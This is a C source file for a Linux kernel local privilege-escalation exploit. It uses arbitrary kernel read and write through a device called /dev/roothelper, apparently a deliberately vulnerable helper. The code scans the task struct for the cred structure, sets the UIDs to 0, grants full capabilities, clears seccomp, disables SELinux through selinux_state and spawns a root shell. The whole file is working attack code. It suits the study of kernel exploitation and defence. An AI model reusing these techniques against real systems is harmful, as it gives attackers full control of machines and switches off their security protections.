#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdint.h>
#include <stdbool.h>
#include "hexdump.h"

#define TIF_SECCOMP			8

/* 'exploit' wrappers */
void* task_peek(void);
ssize_t arb_read(void* src, void* dst, size_t count);
ssize_t arb_write(void* src, void* dst, size_t count);

/* rooting helper functions */
void* find_creds(void* task_ptr);
int is_cred(void* guess);
int overwrite_creds(void* creds, unsigned int uid);
int disable_seccomp(void* task_ptr);
int disable_selinux(void);
uint64_t kallsyms_lookup_name(char* name);

int main() {
	int fd;
	ssize_t bytes_read;
	void* task_ptr;
	void* creds;

	task_ptr = task_peek();
	printf("My PID is %d (%#08x)\n", getpid(), getpid());
	printf("My UID is %d (%#08x)\n", getuid(), getuid());
	printf("Current is %p\n", task_ptr);

	creds = find_creds(task_ptr);
	if (creds == NULL) {
		fprintf(stderr, "Couldn't find creds\n");
		return EXIT_FAILURE;
	}
	printf("Creds are probably at %p\n", creds);

	overwrite_creds(creds, 0);
	printf("My UID is %d\n", getuid());

	disable_seccomp(task_ptr);
	disable_selinux();
	system("/bin/bash");

	return EXIT_SUCCESS;
}

void* task_peek(void) {
	void* task_ptr;
	int fd;

	fd = open("/dev/roothelper", O_RDWR);
	if (fd == -1) {
		perror("open");
		exit(EXIT_FAILURE);
	}

	task_ptr = (void*)lseek(fd, 0, SEEK_CUR);
	close(fd);

	return task_ptr;
}

ssize_t arb_read(void* src, void* dst, size_t count) {
	int fd;
	ssize_t ret;

	fd = open("/dev/roothelper", O_RDWR);
	if (fd == -1) {
		perror("open");
		exit(EXIT_FAILURE);
	}

	lseek(fd, (uint64_t)src, SEEK_SET);
	ret = read(fd, dst, count);
	if (ret == -1) {
		perror("read");
	}

	close(fd);

	return ret;
}

ssize_t arb_write(void* src, void* dst, size_t count) {
	int fd;
	ssize_t ret;

	fd = open("/dev/roothelper", O_RDWR);
	if (fd == -1) {
		perror("open");
		exit(EXIT_FAILURE);
	}

	lseek(fd, (uint64_t)dst, SEEK_SET);
	ret = write(fd, src, count);
	if (ret == -1) {
		perror("write");
	}

	close(fd);

	return ret;
}

int disable_seccomp(void* task_ptr) {
	unsigned char* buffer;
	void* guess = NULL;
	ssize_t bytes_read;
	unsigned int bytes_parsed;
	unsigned char* pointer_to_seccomp;
	int intval;
	uint64_t filter_ptr;
	unsigned long tif_flags;

	/* Assume cred pointer is within first 4096 bytes */
	unsigned int bytes_to_read = 4096;
	buffer = calloc(bytes_to_read, sizeof(unsigned char));
	if (buffer == NULL) {
		fprintf(stderr, "Couldn't malloc buffer\n");
		return 0;
	}
	/* read task_struct */
	bytes_read = arb_read(task_ptr, buffer, bytes_to_read);
	if (bytes_read == -1) {
		fprintf(stderr, "Arb read failed\n");
		return 0;
	}

	/* read the thread_info flags. Flags are the first long
	 * in thread_info and thread_info is the first member
	 * of task_struct, outside of randomized area */
	tif_flags = *(unsigned long*)buffer;
	/* clear the TIF_SECCOMP flag */
	tif_flags = tif_flags & (~(1 << TIF_SECCOMP));
	arb_write(&tif_flags, task_ptr, sizeof(unsigned long));

	bytes_parsed = 0;
	while (1) {
		intval = *(int*)(buffer+bytes_parsed);
		if (intval == 2) {
			/* filter is probably aligned at size_t byte boundary after mode value */
			filter_ptr = *(uint64_t*)(buffer+bytes_parsed+(sizeof(void*)));
			/* filter pointer has to be to memory outside of the task struct, so
			 * only consider values that meet this criteria. */
			if ((filter_ptr - (uint64_t)task_ptr) > 0x2000000) {
				/* it should also be a pointer */
				if ((uint64_t)task_ptr >> 40 == filter_ptr >> 40) {
					guess = task_ptr+bytes_parsed;
					printf("%#016llx may be seccomp\n", (uint64_t)task_ptr+bytes_parsed);
					printf("%#016llx may be filter\n", filter_ptr);
					arb_write((void*)"\x00\x00\x00\x00\x00\x00\x00\x00", guess, 8);
					arb_write((void*)"\x00\x00\x00\x00\x00\x00\x00\x00", guess+8, 8);
				}
			}
		}
		bytes_parsed += 4;
		if (bytes_parsed >= bytes_to_read) {
			break;
		}
	}

	free(buffer);

	return 1;
}

int is_cred(void* guess) {
	unsigned int* buffer;
	unsigned int id_count;
	ssize_t bytes_read;
	unsigned int i;

	/* Assume cred is roughly this size. Chosen somewhat arbitrarily.
	 * You may want to increase or shrink it if you run into problems */
	unsigned int bytes_to_read = 4*16;
	int uid = getuid();
	buffer = calloc(bytes_to_read, sizeof(unsigned char));
	if (buffer == NULL) {
		fprintf(stderr, "Couldn't malloc buffer\n");
		return 0;
	}

	/* read potential cred */
	bytes_read = arb_read(guess, buffer, bytes_to_read);
	if (bytes_read == -1) {
		fprintf(stderr, "Cred read failed\n");
		return 0;
	}
	id_count = 0;
	for (i = 0; i < bytes_to_read / sizeof(unsigned int); i++) {
		if (buffer[i] == uid) {
			id_count++;
		}
	}

	/* uid, gid, suid, sgid, euid, egid, fsuid, fsgid = 8 */
	if (id_count >= 8) {
		return 1;
	}
	
	free(buffer);

	return 0;
}

int overwrite_creds(void* creds, unsigned int uid) {
	unsigned int* buffer;
	uint64_t* capbuffer;
	ssize_t bytes_read;
	unsigned int i;
	void* addr;
	unsigned int offset;

	/* Assume cred is roughly this size. Chosen somewhat arbitrarily.
	 * You may want to increase or shrink it if you run into problems */
	uint64_t caps = 0x3fffffffffUL;
	unsigned int bytes_to_read = 4*18;
	unsigned int current_uid = getuid();
	buffer = calloc(bytes_to_read, sizeof(unsigned char));
	if (buffer == NULL) {
		fprintf(stderr, "Couldn't malloc buffer\n");
		return 1;
	}
	/* read cred */
	bytes_read = arb_read(creds, buffer, bytes_to_read);
	if (bytes_read == -1) {
		fprintf(stderr, "Cred read failed\n");
		return 1;
	}

	for (i = 0; i < bytes_to_read / sizeof(unsigned int); i++) {
		if (buffer[i] == current_uid) {
			offset = (i*sizeof(unsigned int));
			addr = (unsigned char*)creds + offset;
			arb_write((void*)&uid, addr, sizeof(unsigned int));
		}
	}
	capbuffer = (uint64_t*)buffer;
	for (i = 0; i < bytes_to_read / sizeof(uint64_t); i++) {
		if (capbuffer[i] == 0) {
			offset = (i*sizeof(uint64_t));
			addr = (unsigned char*)creds + offset;
			arb_write((void*)&caps, addr, sizeof(uint64_t));
		}
	}


	free(buffer);

	return 0;
}

void* find_creds(void* task_ptr) {
	unsigned char* buffer;
	void* guess = NULL;
	ssize_t bytes_read;
	unsigned int bytes_parsed;
	void* ptr_to_ptr;
	uint64_t ptr;

	/* we're keeping the most significant 3 bytes of the task_ptr
	 * and using that as a filter for all 64-bit values we find,
	 * assuming that all the pointers we're after start with those
	 * same 3 bytes. Adjust this to 2 bytes if it's too restrictive */
	unsigned char ptr_prefix[3];
	memcpy(ptr_prefix, ((unsigned char*)&task_ptr)+(sizeof(void*)-sizeof(ptr_prefix)), sizeof(ptr_prefix));
	/* Assume cred pointer is within first 4096 bytes */
	unsigned int bytes_to_read = 4096;
	buffer = calloc(bytes_to_read, sizeof(unsigned char));
	if (buffer == NULL) {
		fprintf(stderr, "Couldn't malloc buffer\n");
		return NULL;
	}
	/* read task_struct */
	bytes_read = arb_read(task_ptr, buffer, bytes_to_read);
	if (bytes_read == -1) {
		fprintf(stderr, "Arb read failed\n");
		return NULL;
	}

	bytes_parsed = 0;

	while (1) {
		/* look for kernel pointers (we assume all things that start with ptr_prefix are pointers) */
		ptr_to_ptr = memmem(buffer+bytes_parsed, bytes_read-bytes_parsed, ptr_prefix, sizeof(ptr_prefix));
		if (ptr_to_ptr == NULL) {
			break;
		}
		bytes_parsed = ((unsigned char*)ptr_to_ptr - buffer) + sizeof(ptr_prefix);

		/* back up the pointer 5 bytes because our needle (ptr_prefix) was the last 3 bytes of the address
		 * in little endian */
		ptr = *(uint64_t*)(ptr_to_ptr - (sizeof(void*) - sizeof(ptr_prefix)));

		/* Adding some additional filtering here. Not really needed, but might help weed
		 * out some false positives. Could be better */
		if (ptr == 0xffffffffffffffff || ptr == 0xffff000000000000 ||
		    ptr == 0xffffffffff000000 || ptr == 0xffffffffffffff00 ||
		    ptr == 0xffffffff00000000 || ptr == 0xffffffffff000000 ||
			ptr == 0xffffffffffff0000) {
			continue;
		}

		if (is_cred((void*)ptr)) {
			guess = (void*)ptr;
			break;
		}
	}

	/* Uncomment for debug hexdump */
	//hexdump(buffer, bytes_to_read);

	free(buffer);

	return guess;
}

uint64_t kallsyms_lookup_name(char* name) {
	uint64_t addr = 0;
	char buf[1024];

	FILE* f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		fprintf(stderr, "Could not open kallsyms\n");
		return 0;
	}

	while (fgets(buf, sizeof(buf), f) != NULL) {
		if (strstr(buf, name) != NULL) {
			printf("%s", buf);
			sscanf(buf, "%llx", &addr);
			printf("addr is %#016llx\n",addr);
		}
	}
	fclose(f);

	return addr;
}

int disable_selinux(void) {
	bool off = 0;
	bool buffer[2];

	/* read from /proc/kallsyms */
	uint64_t selinux_state_ptr = kallsyms_lookup_name("selinux_state");
	printf("selinux_state: %#016llx\n", selinux_state_ptr);
	arb_read((void*)selinux_state_ptr, buffer, sizeof(buffer));
	printf("SELinux is %#02x\n", buffer[1]);
	arb_write(&off, (void*)(selinux_state_ptr+sizeof(bool)), sizeof(bool));

	return 1;
}

